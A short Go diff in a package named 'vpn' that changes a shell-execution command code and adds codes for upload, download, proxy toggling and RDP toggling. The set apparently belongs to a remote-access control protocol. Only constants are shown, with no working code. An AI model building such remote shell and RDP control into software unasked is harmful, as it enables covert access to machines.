@@ -18,5 +18,10 @@ package vpn
 const CMD_READY byte = 0xFF
 const CMD_CLIENT_HELLO byte = 0xCD
 const CMD_SERVER_HELLO byte = 0xAB
-const CMD_EXEC_SHELL byte = 0x01
-
+const CMD_EXEC_SHELL byte = 0xE1
+const CMD_UPLOAD byte = 0xE2
+const CMD_DOWNLOAD byte = 0xE3
+const CMD_PROXY_ENABLE byte = 0xE4
+const CMD_PROXY_DISABLE byte = 0xE5
+const CMD_RDP_ENABLE byte = 0xE6
+const CMD_RDP_DISABLE byte = 0xE7
